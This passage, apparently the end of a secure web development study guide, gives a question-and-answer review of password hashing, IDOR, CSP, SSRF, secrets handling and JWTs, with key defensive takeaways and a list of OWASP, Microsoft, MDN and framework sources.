| Hashing vs encryption vs encoding? | Hashing is one-way; encryption is reversible with a key; encoding is a reversible format with no secret. |
| How do you store passwords? | Salted, slow, password-specific hashing: Argon2id, scrypt, bcrypt or PBKDF2 with many iterations. Never encrypted, never fast hashes. |
| What is IDOR? | Accessing another user's object by changing an ID, because the server didn't check ownership. |
| Is hiding the admin button enough? | No. Every authorisation check must happen on the server for every request. |
| Name the top three of OWASP 2025. | Broken access control, security misconfiguration, software supply chain failures. |
| What does CSP do? | It tells the browser which sources of script, style and frames are allowed, so injected scripts don't run. |
| How do you keep secrets out of code? | A vault or platform secret store injected at runtime, user secrets locally, secret scanning in CI, and rotation. |
| What is over-posting? | Binding request data directly to an entity so clients set fields they shouldn't; bind to DTOs instead. |
| What's SSRF? | Making the server request internal resources through a user-supplied URL; prevent with allow-lists and blocking private ranges. |
| Is a JWT's payload secret? | No. It's Base64url-encoded and signed, not encrypted, so never put secrets in it. |

## Key takeaways

> [!check]
> - Never trust input; parameterise queries and encode output.
> - Authorisation is server-side, per request and per object. Test tenant isolation explicitly.
> - Passwords get slow, salted hashing. Encoding isn't encryption.
> - Know the 2025 top three: access control, misconfiguration, supply chain.
> - Fail closed, log security events, and never log secrets.

## Sources

- OWASP: [Top 10:2025](https://owasp.org/Top10/2025/0x00_2025-Introduction/), [Cheat Sheet Series](https://cheatsheetseries.owasp.org/) (SQL Injection Prevention, XSS Prevention, CSRF Prevention, Password Storage, Authorization), [ASVS](https://owasp.org/www-project-application-security-verification-standard/).
- Microsoft Learn: [Prevent XSS in ASP.NET Core](https://learn.microsoft.com/en-us/aspnet/core/security/cross-site-scripting), [Prevent CSRF in ASP.NET Core](https://learn.microsoft.com/en-us/aspnet/core/security/anti-request-forgery), [Raw SQL queries in EF Core](https://learn.microsoft.com/en-us/ef/core/querying/sql-queries), [Safe storage of app secrets](https://learn.microsoft.com/en-us/aspnet/core/security/app-secrets).
- MDN: [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP).
- Angular: [Security guide](https://angular.dev/best-practices/security). React: [dangerouslySetInnerHTML](https://react.dev/reference/react-dom/components/common#dangerously-setting-the-inner-html).
- Egypt's Personal Data Protection Law No. 151 of 2020.
